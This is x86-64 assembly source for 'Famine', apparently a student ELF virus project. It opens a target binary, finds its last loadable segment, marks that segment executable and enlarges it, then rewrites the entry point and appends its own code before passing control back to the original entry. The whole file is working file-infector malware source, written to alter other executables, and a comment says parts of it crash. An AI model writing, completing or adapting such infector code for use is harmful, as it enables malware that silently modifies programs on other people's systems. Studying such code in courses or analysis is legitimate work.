BITS 64
default rel


section .text
	global _start


	; %rdi %rsi %rdx %r10 %r8 %r9
_start:

famine:
	jmp		entry_point
number:
	mov		rbx, 10
	lea		rdi, [rel num0 + 20]
	mov		rcx, 1

.convert_loop:
	xor		rdx, rdx
	div		rbx
	dec		rdi
	add		dl, '0'
	mov		[rdi], dl
	inc		rcx
	test	rax, rax
	jnz		.convert_loop
	mov		rax, 1
	lea		rsi, [rdi]
	mov		rdi, 1
	mov		rdx, rcx
	syscall
	mov		rcx, 20
	xor		al, al
	lea		rdi, [rel num0]
	rep		stosb
	ret

	jmp entry_point
	num0 dq 0
	num1 dq 0
	num2 dw 0 dw, 0
	stnl db 10
	buf0 dq 0
	buf1 dq 0
	buf2 dq 0
	buf3 dq 0
	buf4 dq 0
	buf5 dq 0
	buf6 dq 0
	buf7 dq 0
	phd0 dq 0
	phd1 dq 0
	phd2 dq 0
	phd3 dq 0
	phd4 dq 0
	phd5 dq 0
	phd6 dq 0
	phd7 dq 0
	phd8 dq 0
	phd9 dq 0
	phd10 dq 0
	phd11 dq 0
	phd12 dq 0
	phd13 dq 0
	phd14 dq 0
	phd15 dq 0
	entry dq 0
	old_e dq 0
	famineb db 0
	famined db 0
	padding	db 1
	faminemsg db 'Famine version 1.0 (c)oded by alexafer-alexafer', 0
	file db	'./test', 0, 10
	msg1 db	'file is elf', 10, 0
	msg2 db	'file is 64', 10, 0
	elfh db 0x7F, 'ELF'
	exec dw 7
entry_point:
	mov		rax, [rel buf0 + 0x18]
	mov		[rel old_e], rax


	mov		al, [rel famineb]
	mov		[rel famined], al
	mov		[rel famineb], byte 1



	lea		rdi, [rel famine]
	lea		rax, [rel .true_end]
	sub		rax, rdi


	mov		rax, 2
	lea		rdi, [rel file]
	mov		rsi, 2
	xor		rdx, rdx
	syscall



	cmp		rax, 0
	jl		.proceed_jmp ; si le file -1



	mov		r8, rax

	xor		rax, rax
	mov		rdi, r8
	lea		rsi, [rel buf0]
	mov		rdx, 64
	syscall


; ICI CA COMMENCE DEJA A CRASH

	mov		rcx, 4
	lea		rsi, [rel buf0]
	lea		rdi, [rel elfh]
	repe	cmpsb
	test	rcx, rcx
	jnz		.proceed_jmp


	cmp		byte [rel buf0 + 4], 2
	jne		.proceed_jmp

	mov		rax, [rel buf0 + 24]

	movzx   rcx, word [rel buf0 + 0x38]
	movzx   rdi, word [rel buf0 + 0x36]
	xor		r11, r11
	xor		r10, r10
	; %rdi %rsi %rdx %r10 %r8 %r9
	; sys_pread64


.start_loop_phdr:
	test	rcx, rcx
	jz		.end_loop_phdr
	mov		r10, rcx
	imul	r10, rdi
	add		r10, 64
	push	r8
	push	r11
	push	rcx
	push	rdi
	mov		rdi, r8
	mov		rdx, 0x38
	lea		rsi, [rel phd0]
	mov		rax, 17
	syscall
	pop		rdi
	pop		rcx
	pop		r11
	pop		r8
	; r9 -> target_phdr offset
	cmp		dword [rel phd0], 1 ; est-ce un load ?
	jne		.next_it_phdr
	mov		rax, qword [rel phd0 + 0x08]  ; p_offset
	add		rax, qword [rel phd0 + 0x20] ; p_filesz

	cmp		rax, r11
	jna		.next_it_phdr
	mov		r11, rax
	mov		r9, r10

	push	r11
	push	rcx
	push	rdi
	mov		rdi, r8
	mov		rdx, 0x38
	lea		rsi, [rel phd8]
	mov		rax, 17
	syscall
	pop		rdi
	pop		rcx
	pop		r11




.next_it_phdr:
	dec		rcx
	jmp		.start_loop_phdr
.end_loop_phdr:
	test	r11, r11
	jz		.proceed_jmp


	; %rdi %rsi %rdx %r10 %r8 %r9
	; 18sys_pwrite64	unsigned int fd	const char *buf	size_t count	loff_t pos
	; on met X sur segment

	mov		al, [buf0 + 0xa]
	test	al, al
	jnz		.proceed_jmp

	push	r9
	push	r11
	mov		rax, 18
	mov		rdi, r8
	lea		rsi, [rel padding]
	mov		rdx, 1
	mov		r10, 0xa
	syscall
	pop		r11
	pop		r9


	push	r11
	mov		rax, [rel phd8 + 0x8]
	sub		r11, rax
	mov		rax, [rel phd8 + 0x10]
	add		r11, rax
	mov		[rel entry], r11
	pop		r11

	push	r9
	push	r11
	mov		rax, 18
	mov		rdi, r8
	lea		rsi, [rel entry]
	mov		rdx, 8
	mov		r10, 0x18
	syscall
	pop		r11
	pop		r9


	push	r9
	push	r11
	mov		rax, 18
	mov		rdi, r8
	lea		rsi, [rel exec]
	mov		rdx, 4
	mov		r10, r9
	add		r10, 0x4
	syscall
	pop		r11
	pop		r9

	push	r11
	lea		rdi, [rel famine]
	lea		r11, [rel .true_end]
	sub		r11, rdi

	mov		rdi, [rel phd8 + 0x20]
	add		rdi, r11
	mov		[rel phd8 + 0x20], rdi

	lea		rdi, [rel famine]
	lea		r11, [rel .true_end]
	sub		r11, rdi

	mov		rdi, qword [rel phd8 + 0x28]
	add		rdi, r11
	mov		[rel phd8 + 0x28], rdi
	pop		r11


	push	r9
	push	r11
	mov		rax, 18
	mov		rdi, r8
	lea		rsi, [rel phd8 + 0x20]
	mov		rdx, 8
	mov		r10, r9
	add		r10, 0x20
	syscall
	pop		r11
	pop		r9

	push	r9
	push	r11
	mov		rax, 18
	mov		rdi, r8
	lea		rsi, [rel phd8 + 0x28]
	mov		rdx, 8
	mov		r10, r9
	add		r10, 0x28
	syscall
	pop		r11
	pop		r9

	; donc jusqu'ici y'a de la place qui a ete libere au niveau
	; des programmes headers c'est bon, il manque plus que modifier dans le header
	; le jmp

	push	r11
	push	r9
	lea		rsi, [rel famine]
	lea		rdx, [rel .true_end]
	sub		rdx, rsi
	mov		r10, r11
	mov		rdi, r8
	mov		rax, 18
	syscall
	pop		r9
	pop		r11




.proceed_jmp:
	mov		rax, 3
	mov		rdi, r8
	syscall



	xor		rax, rax
	mov		al, [rel famined]
	test	al, al
	jz		.end

	mov		rax, [rel entry]
	mov		rdi, [rel old_e]
	sub		rax, rdi
	lea		rdi, [rel famine]
	sub		rdi, rax
	jmp		rdi


.end:
	mov		rax, 60
	xor		rdi, rdi
	syscall
.true_end:
